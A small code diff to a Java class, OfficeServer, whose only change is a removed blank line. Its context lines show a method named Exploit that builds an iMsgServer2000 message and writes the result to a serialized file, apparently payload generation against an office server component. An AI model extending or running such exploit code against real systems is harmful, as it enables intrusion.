@@ -16,7 +16,6 @@ public class OfficeServer {
         TransforBytes.CreateFileFromBytes(Exploit("k.txt"),"k.ser");
     }
 
-
     public static byte[] Exploit(String shell) {
         iMsgServer2000 imsg = new iMsgServer2000();
         imsg.SetMsgByName("DBSTEP", "DBSTEP");
